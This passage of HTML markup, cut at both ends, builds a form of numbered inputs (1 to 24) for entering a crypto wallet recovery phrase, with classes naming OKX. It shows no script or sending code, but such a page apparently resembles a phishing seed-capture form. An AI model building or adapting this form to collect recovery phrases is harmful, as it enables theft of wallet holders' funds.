                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              2
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              3
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              4
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              5
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              6
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              7
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              8
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              9
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              10
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              11
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              12
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="okx-container-15-words"
                      class="okx-container-15-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              13
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              14
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              15
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="okx-container-18-words"
                      class="okx-container-18-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              16
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              17
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              18
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="okx-container-21-words"
                      class="okx-container-21-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              19
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              20
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              21
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="okx-container-24-words"
                      class="okx-container-24-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              22
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              23
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-px-[10px] scwtw-absolute scwtw-top-[13px] scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-1.5"
                        >
                          <div>
                            <p
                              class="font-open-sans scwtw-text-[#909090] dark:scwtw-text-[#ffffff] scwtw-text-[12px] scwtw-font-normal"
                            >
                              24
                            </p>
                          </div>
                          <div class="scwtw-flex scwtw-items-center">
                            <span
                              class="scwtw-h-[16px] scwtw-w-[1px] scwtw-bg-[#e6e6e6] dark:scwtw-bg-[#383838]"
                            ></span>
                          </div>
                        </div>
                        <input
